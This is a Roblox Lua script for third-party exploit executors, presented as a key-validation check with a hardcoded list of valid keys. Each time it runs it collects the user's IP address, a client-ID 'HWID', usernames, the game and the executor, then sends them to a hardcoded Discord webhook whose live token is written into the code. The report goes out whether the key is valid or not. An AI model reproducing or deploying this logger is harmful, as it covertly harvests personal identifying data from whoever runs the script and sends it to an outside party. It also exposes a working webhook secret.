local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer

-- Fetched Information
local Userid = LocalPlayer.UserId
local DName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local GameId = game.PlaceId
local GAMENAME = MarketplaceService:GetProductInfo(GameId).Name
local GameIcon = MarketplaceService:GetProductInfo(GameId).IconImageAssetId
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()  -- Client ID (Simulated HWID)
local GetIp = game:HttpGet("https://v4.ident.me/")  -- Fetch IP address

-- List of valid keys
local validKeys = {
    "LewiQpuEjINMXqTa", "8As9kpVvUqH3SDDD", "YYxM4KbqUJhKYT8H", "h5L2FsPLCb0P8x6h", "B8QGlpDkrCMQlr8L",
    "3Cb1W59VJyQueIeU", "pTv5QoAfieZZUPQY", "2whuamWWf9GyLj20", "92OED3eFOjFSQRCq", "7xm28T7Ug0NISC58",
    "MAohxN4j6ZM6sJ7j", "0lydJaJfQECNdla8", "LPh0oyUnz1b0PQzC", "u5DSnaXvDfjaqRmB", "iq4SznVlNwBXNjXg",
    "HSYn6Uqk9fsQ04mc", "hpWv8pf353aj1BoT", "9X0kbFSa2ZV4mnNa", "p9nLOhsw25DYteBn", "13xba7bkgo12k6UO",
    "gHk4k45TWtF1yICU", "jjNOqOCyj6DEJAQF", "Ja6vEFjWAkRdwZxK", "J1BYHSeAbMql9xbd", "ZwaMZFyXZZDJ3zhu",
    "XC8VNTz7ZJNtWUek", "cRCe5NLVvBXXeY62", "Qze83ndbuQlKRmIk", "ZsnMEqaAuCbT673u", "R2fPRTB3f0hCJ7v8",
    "8Ez2duMMtFK2o6cA", "uw5saCdA025jhF3T", "1XqIyDrkjDyNWoIu", "MF3Sv8CsLDbpc6Ib", "ign2dunCrkarNmA4",
    "h5exFEAafEX4QbuA", "iI8AUGpTdxDSRI1y", "yUHenRmhG2KGAa9i", "WNQPcdW2elhmBMwb", "FnarZ1O52xURypLU",
    "NMQhrgoO5wCS4Mvq", "GceFW0RVPuuFZBWb", "Z09RsGYV3YoApIJY", "S69KZTRCmbkU0MMv", "zssMwufQCs9cCng2",
    "v6DT3q1L0FU4Eg1t", "dMCdSIJIG0P2l43G", "cCdGQCXUCpm9WowN", "lP1ZDCuanvSGmXJI", "Fa8yO4eX0pArsK7c"
}

-- Validate the key
local function isKeyValid(key)
    for _, validKey in ipairs(validKeys) do
        if key == validKey then
            return true
        end
    end
    return false
end

-- Function to detect Executor (if applicable)
local function detectExecutor()
    return identifyexecutor()  -- You can replace this with a custom implementation if needed
end

-- Create Data to Send to Webhook
local function createWebhookData(isValidKey)
    local keyStatus = isValidKey and "valid" or "invalid"
    local webhookcheck = detectExecutor()  -- Detect the executor used (if applicable)

    local data = {
        ["avatar_url"] = "",
        ["content"] = "",
        ["embeds"] = {
            {
                ["author"] = {
                    ["name"] = "Script executed",
                    ["url"] = "https://roblox.com",
                },
                ["description"] = string.format(
                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**HWID:** %s" ..
                    "\n**IP:** %s\n**Key Status:** %s\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                    "\n**Game:** %s \n**Game Id**: %d" ..
                    "\n**Executor:** %s" ..
                    "\n\n**Game Icon:**" ..
                    "\n![Game Icon](https://www.roblox.com/asset-thumbnail/image?assetId="..GameIcon.."&width=150&height=150&format=png)" ..
                    "\n\n**Date:** %s\n**Time:** %s",
                    Userid, DName, Name, Userid, GetHwid, GetIp, keyStatus, GameId, GAMENAME, GameId, webhookcheck,
                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X"))
                ),
                ["type"] = "rich",
                ["color"] = tonumber("0xFFD700"),  -- You can change the color here
                ["thumbnail"] = {
                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
                },
            }
        }
    }

    return HttpService:JSONEncode(data)  -- Return the data as JSON
end

-- Send Data to Webhook
local function sendWebhook(webhookUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request  -- Use appropriate request method for your executor
    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(abcdef)  -- Send the data
end

-- Replace with your actual webhook URL
local webhookUrl = "https://discord.com/api/webhooks/1315519394700464149/NQDBoAYSWFeKh8b9HpCaYvEk3sz5sOWEtCRp6UlfgoYee8OfvJm3Nb-jN9wSLmy37-Gl"

-- User inputs their key here
local userKey = "input_key_here"  -- Replace this with the actual input key

-- Check if the key is valid
local isValidKey = isKeyValid(userKey)

-- Print key validation status
if isValidKey then
    print("valid")
else
    print("invalid")
end

-- Create the data to send to the webhook
local webhookData = createWebhookData(isValidKey)

-- Send the data to the webhook
sendWebhook(webhookUrl, webhookData)
